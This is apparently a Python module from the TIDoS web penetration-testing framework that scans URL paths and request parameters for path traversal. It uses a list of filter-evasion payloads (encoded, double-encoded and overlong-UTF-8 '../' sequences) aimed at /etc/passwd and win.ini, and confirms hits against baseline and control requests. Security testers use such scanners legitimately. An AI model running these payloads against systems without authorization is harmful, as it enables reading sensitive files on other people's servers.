#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

# This module requires TIDoS Framework
# https://github.com/0xInfection/TIDoS-Framework

"""Native path traversal scanner -- URL path and request parameters, no external tools."""

from __future__ import annotations

from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlsplit, urlunsplit

import core.variables as variables
from core.methods import fileinj, inject, webinj
from core.methods import modkit as kit
from core.methods.print import pvln

info = ("Finds path traversal in the URL path and in request parameters -- no external tools. "
        "Directory traversal sequences and their encoded / filter-evasion variants (../, ..%2f, "
        "%2e%2e/, double encoding, ....//, ..;/, ..%5c, overlong UTF-8) are injected into every "
        "parameter (PARAM, or all parameters found by crawling) and appended to the target "
        "directories (DIRECTORY, or the target plus crawled directories). A read is confirmed only "
        "when the /etc/passwd or win.ini content signature is in the response, not in the baseline, "
        "and not in a control request for a missing file. The URL-path vector crawls for directories "
        "only when PARAM is empty. Use lfi for absolute-path reads and php:// wrappers.")
searchinfo = "Path Traversal Scanner"

LEVELS = 10
# (segment, separator for the file path, files) -- the segment is repeated LEVELS times
VARIANTS = (
    ("../", "/", ("passwd", "win.ini")),
    ("..%2f", "%2f", ("passwd", "win.ini")),
    ("%2e%2e/", "/", ("passwd",)),
    ("%2e%2e%2f", "%2f", ("passwd",)),
    ("..%252f", "%252f", ("passwd",)),
    ("%252e%252e%252f", "%252f", ("passwd",)),
    ("....//", "/", ("passwd",)),
    ("..;/", "/", ("passwd",)),
    ("%c0%ae%c0%ae/", "/", ("passwd",)),
    ("..%c0%af", "%c0%af", ("passwd",)),
    ("..\\", "\\", ("win.ini",)),
    ("..%5c", "%5c", ("win.ini", "passwd")),
)
FILES = {"passwd": ("etc", "passwd"), "win.ini": ("windows", "win.ini")}

CONFIRMED = "Path traversal (confirmed)"

properties = {
    **inject.OPTIONS,
    "DIRECTORY": ["Directory for the URL-path vector, e.g. /static/ or a full URL "
                  "(empty: target + crawled directories)", ""],
    "MAXDIRS": ["Maximum directories tested in the URL-path vector (default 15)", ""],
    **kit.AUTH_OPTIONS,
}


def payloads() -> list[tuple[str, str]]:
    """(traversal payload, signature key) pairs."""
    out = []
    for seg, sep, files in VARIANTS:
        for key in files:
            out.append((seg * LEVELS + sep.join(FILES[key]), key))
    return out


# --------------------------------------------------------------------------
# parameter vector
# --------------------------------------------------------------------------

def check_param(point: inject.Point, s, items: list[tuple[str, str]]):
    base = fileinj.body(point.send(s, point.original))
    base2 = fileinj.body(point.send(s, inject.marker()))
    baseline = base + "\n" + base2  # nothing shown for a harmless value counts
    for payload, key in items:
        ev = fileinj.file_evidence(fileinj.body(fileinj.send(point, s, payload)), baseline, key)
        if not ev:
            continue
        ctl = fileinj.control_payload(payload, key)
        if ctl and fileinj.file_evidence(fileinj.body(fileinj.send(point, s, ctl)), baseline, key):
            continue  # the "file content" shows up for a missing file too
        yield inject.Finding(point, payload, f"{fileinj.file_label(key)} content: {ev}", CONFIRMED)
        return


# --------------------------------------------------------------------------
# URL-path vector
# --------------------------------------------------------------------------

def _directory(url: str) -> str:
    parts = urlsplit(url)
    path = parts.path or "/"
    path = path if path.endswith("/") else path.rsplit("/", 1)[0] + "/"
    return urlunsplit((parts.scheme, parts.netloc, path, "", ""))


def directories(web, crawl: bool) -> list[str]:
    base = kit.url(web) + "/"
    raw = kit.option(properties, "DIRECTORY", "Directory for the URL-path vector, e.g. /static/ (enter to crawl)", "")
    limit = max(1, kit.integer(properties, "MAXDIRS", "Maximum directories tested", 15))
    if raw:
        url = raw if "://" in raw else urljoin(base, raw)
        return [url if url.endswith("/") else url + "/"]
    target = kit.url(web)
    dirs = [_directory(target + ("/" if urlsplit(target).path in ("", "/") else ""))]
    if crawl:
        depth = max(0, kit.integer(properties, "DEPTH", "Crawl depth for directory discovery", 1))
        if depth:
            from core.methods import crawler  # late import: pulls in bs4/lxml and Katana
            res = crawler.crawl(web, depth, max_pages=60, headers=kit.request_headers(properties))
            if res.error:
                kit.warn(f"{res.error} Testing the target directory only (or set DIRECTORY).")
            dirs += [_directory(u) for u in sorted(res.internal | set(res.pages) | res.assets)]
    dirs = list(dict.fromkeys(dirs))
    if len(dirs) > limit:
        kit.warn(f"{len(dirs)} directories found; testing the first {limit} (raise MAXDIRS).")
    return dirs[:limit]


def check_path(s, base: str, items: list[tuple[str, str]]):
    baseline = fileinj.body(fileinj.raw_get(s, base)) + fileinj.body(fileinj.raw_get(s, base + "tid404.txt"))
    for payload, key in items:
        url = base + payload
        ev = fileinj.file_evidence(fileinj.body(fileinj.raw_get(s, url)), baseline, key)
        if not ev:
            continue
        ctl = fileinj.control_payload(payload, key)
        if ctl and fileinj.file_evidence(fileinj.body(fileinj.raw_get(s, base + ctl)), baseline, key):
            continue
        return url, key, ev
    return None


# --------------------------------------------------------------------------

def pathtrav(web):
    pvln("path traversal")
    rec = kit.Recorder(web, kit.CRITICAL, "pathtrav")
    items = payloads()
    s = webinj.session(properties, timeout=12)
    param_set = bool(str(properties.get("PARAM", ["", ""])[1]).strip())
    lines = []

    # ---- parameter vector ----
    points = inject.discover(web, properties)
    if points:
        kit.info(f"Testing {len(points)} parameter(s) with {len(items)} traversal payloads...")
        for f in inject.scan(points, lambda p: check_param(p, s, items)):
            kit.bullet(f.evidence)
            lines.append(f"{CONFIRMED}: {f.point} <- {f.payload} -- {f.evidence}")

    # ---- URL-path vector (crawl only when no explicit PARAM) ----
    dirs = directories(web, crawl=not param_set)
    kit.info(f"Testing {len(dirs)} director{'y' if len(dirs) == 1 else 'ies'} in the URL path "
             f"with {len(items)} payloads...")
    with ThreadPoolExecutor(max_workers=max(1, min(variables.processes, len(dirs), 16))) as pool:
        for r in pool.map(lambda d: check_path(s, d, items), dirs):
            if not r:
                continue
            url, key, ev = r
            kit.found(CONFIRMED, url)
            kit.bullet(f"{fileinj.file_label(key)} content: {ev}")
            lines.append(f"{CONFIRMED}: {url} -- {fileinj.file_label(key)} content: {ev}")

    if not lines:
        kit.bad("No path traversal found.")
        rec("No path traversal found.")
        return []
    rec(lines)
    return lines


def attack(web):
    pathtrav(web)
